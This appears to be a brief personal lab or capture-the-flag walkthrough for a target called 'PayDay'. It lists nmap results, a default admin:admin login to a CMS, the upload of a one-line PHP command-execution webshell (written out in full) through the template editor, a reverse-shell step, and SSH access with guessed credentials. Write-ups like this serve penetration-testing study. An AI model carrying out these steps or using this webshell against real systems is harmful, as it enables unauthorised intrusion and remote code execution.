# PayDay
# date - 5-8-2023
# ip - 192.168.230.39

default pass at cms admin > templates can edit > rev shell uploaded > get revshell > brutforce or guess pass same as name of user

# nmap
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
993/tcp open  ssl/imap    Dovecot imapd
995/tcp open  ssl/pop3    Dovecot pop3d



http://192.168.230.39/admin.php will direct us to the admin login page, the password for the admin user is unchanged. admin:admin




# exploitation 
Navigate to → http://192.168.82.39/admin.php?target=template_editor,then upload via local then choose shell.phtml

The contents of shell.phtml should be <?php system($_GET[‘cmd’]); ?> for us to get a webshell. We can also use php-reverse-shell.phtml to get a reverse shell right away.
#
 http://192.168.230.39/skins/shell.phtml

 got rev shell

 brutforce ssh
 or guess
 patrick:patrick
 boom

└─$ ssh patrick@192.168.230.39 -oHostKeyAlgorithms=+ssh-dss  



